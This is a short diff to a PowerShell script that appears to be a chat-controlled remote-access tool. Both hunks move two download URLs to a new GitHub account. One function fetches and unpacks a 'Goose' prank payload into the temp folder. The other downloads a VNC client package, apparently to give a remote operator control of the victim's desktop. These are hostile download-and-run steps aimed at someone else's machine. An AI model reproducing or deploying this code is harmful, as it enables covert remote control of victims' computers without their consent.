@@ -604,7 +604,7 @@ param ([string[]]$url)
 }
 
 Function Goose {
-    $url = "https://github.com/beigeworm/assets/raw/main/Goose.zip"
+    $url = "https://github.com/wormserv/assets/raw/main/Goose.zip"
     $tempFolder = $env:TMP
     $zipFile = Join-Path -Path $tempFolder -ChildPath "Goose.zip"
     $extractPath = Join-Path -Path $tempFolder -ChildPath "Goose"
@@ -747,7 +747,7 @@ Function StartUvnc{
 
     sendMsg -Message ":arrows_counterclockwise: ``Starting UVNC Client..`` :arrows_counterclockwise:"
     $tempFolder = "$env:temp\vnc"
-    $vncDownload = "https://github.com/beigeworm/assets/raw/main/winvnc.zip"
+    $vncDownload = "https://github.com/wormserv/assets/raw/main/winvnc.zip"
     $vncZip = "$tempFolder\winvnc.zip" 
     if (!(Test-Path -Path $tempFolder)) {
         New-Item -ItemType Directory -Path $tempFolder | Out-Null
